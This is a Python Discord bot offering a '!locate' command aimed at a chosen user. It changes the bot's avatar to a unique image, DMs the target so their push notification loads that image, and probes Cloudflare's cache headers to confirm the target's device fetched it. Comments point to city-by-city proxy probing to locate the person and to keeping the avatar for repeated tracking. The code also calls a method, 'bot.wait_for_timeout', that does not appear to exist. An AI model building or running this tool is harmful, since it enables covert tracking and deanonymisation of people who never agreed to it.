import discord
from discord.ext import commands
import requests
import os
import time
import random
import string
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading

# Get the token from Railway's environment variables
TOKEN = os.getenv('DISCORD_TOKEN')

if not TOKEN:
    raise ValueError("DISCORD_TOKEN environment variable is not set!")

# Intents required for DMs and reading messages if needed
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Simple keep-alive to prevent Railway from sleeping
def keep_alive():
    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
    print("Keeping alive...")
    server.serve_forever()

p = threading.Thread(target=keep_alive)
p.start()

@bot.event
async def on_ready():
    print(f'Bot is ready! Logged in as {bot.user}')
    await bot.change_presence(activity=discord.Game(name="!locate <user>"))

@bot.command()
async def locate(ctx, user: discord.User):
    # 1. Generate a unique image URL
    # Using placehold.co with a random color and ID to ensure uniqueness
    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    color = ''.join(['%02x' % random.randint(0, 255) for _ in range(3)])
    img_url = f"https://placehold.co/60x60/{color}/ffffff.png?text={random_id}"
    
    # Download the image to save as avatar
    try:
        response = requests.get(img_url)
        if response.status_code == 200:
            await ctx.bot.user.edit(avatar=response.content)
            print(f"Avatar changed to: {img_url}")
        else:
            await ctx.send("Failed to download test image.")
            return
    except Exception as e:
        await ctx.send(f"Error downloading image: {e}")
        return

    # 2. Send DM to trigger push notification
    try:
        await user.send("Check your notifications!")
        await ctx.send(f"Sent DM to {user.name}. Waiting for cache hit...")
    except discord.Forbidden:
        await ctx.send(f"Cannot send DM to {user.name} (DMs closed or blocked).")
        return

    # 3. Wait for the device to process the push and cache the image
    # iOS/Android usually take 5-15 seconds to fetch assets for push previews
    await ctx.send("Waiting 15 seconds for target device to cache the image...")
    await bot.wait_for_timeout(15)

    # 4. Probe Cloudflare Cache Status
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    
    try:
        # Check global cache status first
        resp = requests.head(img_url, headers=headers, timeout=5)
        cache_status = resp.headers.get('cf-cache-status', 'MISS')
        
        if cache_status == 'HIT':
            await ctx.send(f"✅ **Cache HIT** detected!")
            await ctx.send(f"The target's device likely loaded the image via push notification.")
            
            # Provide the Ray ID for further analysis if needed
            cf_ray = resp.headers.get('cf-ray', 'Unknown')
            await ctx.send(f"Cloudflare Ray ID: `{cf_ray}`")
            
            # Note: To get precise location, you would need to run this request 
            # through proxies in specific cities. This single check confirms activity.
            
        else:
            await ctx.send(f"❌ **Cache MISS**.")
            await ctx.send("The target may not have processed the push yet, or their CDN TTL expired.")
            
    except Exception as e:
        await ctx.send(f"Error probing cache: {e}")

    # Optional: Reset avatar back to default after some time or leave it
    # Leaving it helps if you want to track multiple hits with the same "fake" identity

bot.run(TOKEN)